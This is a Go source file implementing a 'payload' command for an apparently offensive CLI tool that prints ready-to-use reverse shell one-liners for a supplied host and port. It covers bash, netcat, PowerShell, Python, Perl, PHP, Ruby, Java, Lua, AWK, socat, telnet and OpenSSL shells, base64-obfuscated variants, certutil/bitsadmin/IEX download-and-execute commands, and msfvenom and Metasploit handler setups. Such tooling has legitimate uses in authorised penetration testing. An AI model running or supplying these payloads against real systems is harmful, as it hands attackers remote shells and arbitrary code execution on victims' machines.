package cmd

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"strings"
	"unicode/utf16"

	"github.com/realibrahimsql/Gocat/internal/logger"
	"github.com/spf13/cobra"
)

var (
	payloadInterface string
	payloadFormat    string
	payloadEncode    bool
	payloadAll       bool
	payloadType      string
)

var payloadCmd = &cobra.Command{
	Use:     "payload [host] [port]",
	Aliases: []string{"payloads", "generate", "gen"},
	Short:   "Generate reverse shell payloads for various platforms",
	Long: `Generate ready-to-use reverse shell payloads for common platforms and languages.

Supported payload types:
  bash        Bash TCP reverse shell
  nc          Netcat + named pipe reverse shell
  powershell  PowerShell reverse shell
  python      Python reverse shell
  perl        Perl reverse shell
  ruby        Ruby reverse shell
  php         PHP reverse shell
  java        Java reverse shell
  lua         Lua reverse shell
  go          Go reverse shell (one-liner)
  awk         AWK reverse shell
  socat       Socat reverse shell
  telnet      Telnet reverse shell (two-port)
  msfvenom    Metasploit msfvenom commands
  metasploit  Metasploit handler configuration
  conpty      ConPtyShell (Windows PTY)
  all         Show all payloads

Payloads are base64-encoded for safe transmission when --encode is used.

Examples:
  gocat payload 10.10.14.5 4444
  gocat payload 10.10.14.5 4444 --type bash
  gocat payload 10.10.14.5 4444 --type powershell --encode
  gocat payload 10.10.14.5 4444 --all
  gocat payload --interface eth0 4444`,
	Args: cobra.RangeArgs(1, 2),
	Run:  runPayload,
}

func init() {
	rootCmd.AddCommand(payloadCmd)

	payloadCmd.Flags().StringVarP(&payloadInterface, "interface", "I", "", "Network interface to use for IP")
	payloadCmd.Flags().StringVarP(&payloadFormat, "format", "f", "text", "Output format: text, json, oneliner")
	payloadCmd.Flags().BoolVarP(&payloadEncode, "encode", "E", false, "Base64 encode payloads for safe transmission")
	payloadCmd.Flags().BoolVarP(&payloadAll, "all", "a", false, "Show all payload types")
	payloadCmd.Flags().StringVarP(&payloadType, "type", "T", "all", "Payload type to generate")
}

func runPayload(cmd *cobra.Command, args []string) {
	var host, port string

	if len(args) == 2 {
		host = args[0]
		port = args[1]
	} else if len(args) == 1 {
		// Could be just a port with --interface
		if payloadInterface != "" {
			host = getInterfaceIP(payloadInterface)
			if host == "" {
				logger.Fatal("Cannot determine IP for interface: %s", payloadInterface)
				return
			}
			port = args[0]
		} else {
			// Try to get default IP
			host = getDefaultIP()
			port = args[0]
		}
	}

	if host == "" || port == "" {
		logger.Fatal("Usage: gocat payload <host> <port>")
		return
	}

	theme := logger.GetCurrentTheme()

	theme.Highlight.Printf("\n🎯 Reverse Shell Payloads for %s:%s\n\n", host, port)

	payloadType := strings.ToLower(payloadType)
	if payloadAll {
		payloadType = "all"
	}

	payloads := generatePayloads(host, port)

	if payloadType == "all" {
		for _, p := range payloads {
			printPayload(p, theme)
		}
	} else {
		found := false
		for _, p := range payloads {
			if strings.ToLower(p.Name) == payloadType ||
				strings.ToLower(p.ShortName) == payloadType {
				printPayload(p, theme)
				found = true
			}
		}
		if !found {
			logger.Error("Unknown payload type: %s", payloadType)
			logger.Info("Available types: bash, nc, powershell, python, perl, ruby, php, java, lua, go, awk, socat, telnet, msfvenom, metasploit, conpty")
		}
	}
}

type payload struct {
	Name      string
	ShortName string
	Platform  string
	Command   string
	Encoded   string
}

func printPayload(p payload, theme *logger.ColorTheme) {
	theme.Success.Printf("═══ %s (%s) ═══\n", p.Name, p.Platform)
	if payloadEncode && p.Encoded != "" {
		fmt.Println(p.Encoded)
	} else {
		fmt.Println(p.Command)
	}
	fmt.Println()
}

func generatePayloads(host, port string) []payload {
	var payloads []payload

	// Bash TCP
	bashCmd := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", host, port)
	bashBg := fmt.Sprintf("(bash >& /dev/tcp/%s/%s 0>&1) &", host, port)
	bashEncoded := base64.StdEncoding.EncodeToString([]byte(bashBg))
	payloads = append(payloads, payload{
		Name:      "Bash TCP",
		ShortName: "bash",
		Platform:  "Linux/Unix",
		Command:   bashCmd + "\n\n# Background version:\n" + bashBg + "\n\n# Base64 encoded:\nprintf " + bashEncoded + "|base64 -d|bash",
		Encoded:   "printf " + bashEncoded + "|base64 -d|bash",
	})

	// Bash UDP
	bashUDP := fmt.Sprintf("bash -i >& /dev/udp/%s/%s 0>&1", host, port)
	payloads = append(payloads, payload{
		Name:      "Bash UDP",
		ShortName: "bash-udp",
		Platform:  "Linux/Unix",
		Command:   bashUDP,
	})

	// Netcat + named pipe
	ncCmd := fmt.Sprintf("rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc %s %s >/tmp/_", host, port)
	ncBg := fmt.Sprintf("(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc %s %s >/tmp/_) >/dev/null 2>&1 &", host, port)
	ncEncoded := base64.StdEncoding.EncodeToString([]byte(ncBg))
	payloads = append(payloads, payload{
		Name:      "Netcat + Named Pipe",
		ShortName: "nc",
		Platform:  "Linux/Unix",
		Command:   ncCmd + "\n\n# Background version:\n" + ncBg + "\n\n# Base64 encoded:\nprintf " + ncEncoded + "|base64 -d|sh",
		Encoded:   "printf " + ncEncoded + "|base64 -d|sh",
	})

	// Netcat -e
	payloads = append(payloads, payload{
		Name:      "Netcat -e",
		ShortName: "nc-e",
		Platform:  "Linux/Unix",
		Command:   fmt.Sprintf("nc -e /bin/sh %s %s", host, port),
	})

	// Netcat -c
	payloads = append(payloads, payload{
		Name:      "Netcat -c",
		ShortName: "nc-c",
		Platform:  "Linux/Unix",
		Command:   fmt.Sprintf("nc -c sh %s %s", host, port),
	})

	// Ncat (with SSL)
	payloads = append(payloads, payload{
		Name:      "Ncat (SSL)",
		ShortName: "ncat",
		Platform:  "Linux/Unix",
		Command:   fmt.Sprintf("ncat --ssl %s %s -e /bin/sh", host, port),
	})

	// PowerShell
	psCmd := fmt.Sprintf(
		`$client = New-Object System.Net.Sockets.TCPClient("%s",%s);`+
			`$stream = $client.GetStream();`+
			`[byte[]]$bytes = 0..65535|%%{0};`+
			`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){`+
			`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);`+
			`$sendback = (iex $data 2>&1 | Out-String );`+
			`$sendback2 = $sendback + "PS " + (pwd).Path + "> ";`+
			`$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`+
			`$stream.Write($sendbyte,0,$sendbyte.Length);`+
			`$stream.Flush()};`+
			`$client.Close()`,
		host, port)
	psEncoded := encodeUTF16LE(psCmd)
	payloads = append(payloads, payload{
		Name:      "PowerShell",
		ShortName: "powershell",
		Platform:  "Windows",
		Command:   "powershell -nop -c \"" + psCmd + "\"\n\n# Encoded version:\ncmd /c powershell -e " + psEncoded,
		Encoded:   "cmd /c powershell -e " + psEncoded,
	})

	// PowerShell (Base64 shorthand)
	payloads = append(payloads, payload{
		Name:      "PowerShell (IEX Download)",
		ShortName: "ps-iex",
		Platform:  "Windows",
		Command: fmt.Sprintf(
			`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/shell.ps1')"`,
			host, port),
	})

	// Python
	pyCmd := fmt.Sprintf(
		`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);`+
			`s.connect(("%s",%s));`+
			`os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);`+
			`subprocess.call(["/bin/sh","-i"])'`,
		host, port)
	payloads = append(payloads, payload{
		Name:      "Python",
		ShortName: "python",
		Platform:  "Linux/Unix",
		Command:   pyCmd,
	})

	// Python3
	py3Cmd := fmt.Sprintf(
		`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);`+
			`s.connect(("%s",%s));`+
			`os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);`+
			`import pty;pty.spawn("/bin/bash")'`,
		host, port)
	payloads = append(payloads, payload{
		Name:      "Python3 (PTY)",
		ShortName: "python3",
		Platform:  "Linux/Unix",
		Command:   py3Cmd,
	})

	// Perl
	perlCmd := fmt.Sprintf(
		`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));`+
			`if(connect(S,sockaddr_in($p,inet_aton($i)))){`+
			`open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`,
		host, port)
	payloads = append(payloads, payload{
		Name:      "Perl",
		ShortName: "perl",
		Platform:  "Linux/Unix/Windows",
		Command:   perlCmd,
	})

	// Ruby
	rubyCmd := fmt.Sprintf(
		`ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`,
		host, port)
	payloads = append(payloads, payload{
		Name:      "Ruby",
		ShortName: "ruby",
		Platform:  "Linux/Unix",
		Command:   rubyCmd,
	})

	// PHP
	phpCmd := fmt.Sprintf(
		`php -r '$sock=fsockopen("%s",%s);exec("sh <&3 >&3 2>&3");'`,
		host, port)
	payloads = append(payloads, payload{
		Name:      "PHP",
		ShortName: "php",
		Platform:  "Linux/Unix/Windows",
		Command:   phpCmd + fmt.Sprintf("\n\n# Alternative:\nphp -r '$sock=fsockopen(\"%s\",%s);$proc=proc_open(\"sh\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'", host, port),
	})

	// Java
	javaCmd := fmt.Sprintf(
		`Runtime r = Runtime.getRuntime();`+
			`Process p = r.exec("/bin/bash -c bash$IFS-i>&/dev/tcp/%s/%s<&1");`+
			`p.waitFor();`,
		host, port)
	payloads = append(payloads, payload{
		Name:      "Java",
		ShortName: "java",
		Platform:  "Linux/Unix",
		Command:   javaCmd,
	})

	// Lua
	luaCmd := fmt.Sprintf(
		`lua -e "require('socket');require('os');t=socket.tcp();`+
			`t:connect('%s','%s');os.execute('sh -i <&3 >&3 2>&3');"`,
		host, port)
	payloads = append(payloads, payload{
		Name:      "Lua",
		ShortName: "lua",
		Platform:  "Linux/Unix",
		Command:   luaCmd,
	})

	// Go
	goCmd := fmt.Sprintf(
		`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%s");`+
			`cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,
		host, port)
	payloads = append(payloads, payload{
		Name:      "Go",
		ShortName: "go",
		Platform:  "Linux/Unix",
		Command:   goCmd,
	})

	// AWK
	awkCmd := fmt.Sprintf(
		`awk 'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell> " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'`,
		host, port)
	payloads = append(payloads, payload{
		Name:      "AWK",
		ShortName: "awk",
		Platform:  "Linux/Unix",
		Command:   awkCmd,
	})

	// Socat
	socatCmd := fmt.Sprintf(
		`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s`,
		host, port)
	payloads = append(payloads, payload{
		Name:      "Socat",
		ShortName: "socat",
		Platform:  "Linux/Unix",
		Command:   socatCmd + "\n\n# Listener side:\n" + fmt.Sprintf("socat file:`tty`,raw,echo=0 tcp-listen:%s", port),
	})

	// Telnet
	payloads = append(payloads, payload{
		Name:      "Telnet",
		ShortName: "telnet",
		Platform:  "Linux/Unix",
		Command:   fmt.Sprintf("TF=$(mktemp -u);mkfifo $TF && telnet %s %s 0<$TF | sh 1>$TF", host, port),
	})

	// OpenSSL
	payloads = append(payloads, payload{
		Name:      "OpenSSL",
		ShortName: "openssl",
		Platform:  "Linux/Unix",
		Command: fmt.Sprintf(
			"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect %s:%s > /tmp/s; rm /tmp/s\n\n"+
				"# Listener side:\nopenssl s_server -quiet -key key.pem -cert cert.pem -port %s", host, port, port),
	})

	// ConPtyShell (Windows PTY)
	conptyCmd := fmt.Sprintf(
		`IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell %s %s`,
		host, port)
	payloads = append(payloads, payload{
		Name:      "ConPtyShell",
		ShortName: "conpty",
		Platform:  "Windows",
		Command:   conptyCmd,
	})

	// Msfvenom commands
	payloads = append(payloads, payload{
		Name:      "Msfvenom Commands",
		ShortName: "msfvenom",
		Platform:  "All",
		Command: fmt.Sprintf(
			"# Linux x64\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f elf > shell.elf\n\n"+
				"# Linux x86\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f elf > shell.elf\n\n"+
				"# Windows x64\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f exe > shell.exe\n\n"+
				"# Windows x86\nmsfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f exe > shell.exe\n\n"+
				"# Python\nmsfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw\n\n"+
				"# ASP\nmsfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f asp > shell.asp\n\n"+
				"# JSP\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw > shell.jsp\n\n"+
				"# WAR\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war > shell.war\n\n"+
				"# PHP\nmsfvenom -p php/reverse_php LHOST=%s LPORT=%s -f raw > shell.php",
			host, port, host, port, host, port, host, port,
			host, port, host, port, host, port, host, port, host, port),
	})

	// Metasploit handler config
	payloads = append(payloads, payload{
		Name:      "Metasploit Handler",
		ShortName: "metasploit",
		Platform:  "All",
		Command: fmt.Sprintf(
			"use exploit/multi/handler\n"+
				"set PAYLOAD generic/shell_reverse_tcp\n"+
				"set LHOST %s\n"+
				"set LPORT %s\n"+
				"set DisablePayloadHandler true\n"+
				"run\n\n"+
				"# Or one-liner:\n"+
				"msfconsole -x \"use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST %s; set LPORT %s; run\"",
			host, port, host, port),
	})

	// Windows certutil download
	payloads = append(payloads, payload{
		Name:      "Windows Download & Execute",
		ShortName: "certutil",
		Platform:  "Windows",
		Command: fmt.Sprintf(
			"# certutil\ncertutil -urlcache -split -f http://%s:%s/shell.exe %%TEMP%%\\shell.exe && %%TEMP%%\\shell.exe\n\n"+
				"# PowerShell\npowershell -c \"(New-Object Net.WebClient).DownloadFile('http://%s:%s/shell.exe','C:\\Windows\\Temp\\shell.exe');Start-Process 'C:\\Windows\\Temp\\shell.exe'\"\n\n"+
				"# Bitsadmin\nbitsadmin /transfer myJob /download /priority high http://%s:%s/shell.exe %%TEMP%%\\shell.exe && %%TEMP%%\\shell.exe",
			host, port, host, port, host, port),
	})

	return payloads
}

func encodeUTF16LE(s string) string {
	runes := []rune(s)
	u16 := utf16.Encode(runes)
	b := make([]byte, 2*len(u16))
	for i, r := range u16 {
		b[2*i] = byte(r)
		b[2*i+1] = byte(r >> 8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

func getInterfaceIP(ifaceName string) string {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return ""
	}

	addrs, err := iface.Addrs()
	if err != nil || len(addrs) == 0 {
		return ""
	}

	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}

	return ""
}

func getDefaultIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		// Fallback: try interfaces
		ifaces, err := net.Interfaces()
		if err != nil {
			return "0.0.0.0"
		}
		for _, iface := range ifaces {
			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			addrs, _ := iface.Addrs()
			for _, addr := range addrs {
				if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil {
					return ipnet.IP.String()
				}
			}
		}
		return "0.0.0.0"
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

// ListInterfaces returns formatted info about all network interfaces
func ListInterfaces() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return fmt.Sprintf("Error listing interfaces: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%-20s %-18s %s\n", "Interface", "IP Address", "MAC"))
	sb.WriteString(strings.Repeat("─", 65) + "\n")

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				if ipnet.IP.To4() != nil {
					mac := iface.HardwareAddr.String()
					if mac == "" {
						mac = "N/A"
					}
					loopback := ""
					if iface.Flags&net.FlagLoopback != 0 {
						loopback = " (loopback)"
					}
					sb.WriteString(fmt.Sprintf("%-20s %-18s %s%s\n",
						iface.Name, ipnet.IP.String(), mac, loopback))
				}
			}
		}
	}

	return sb.String()
}

// PrintInterfaces prints all network interfaces
func PrintInterfaces() {
	fmt.Println(ListInterfaces())
}

func init() {
	// Suppress unused import warning
	_ = os.Stdin
}
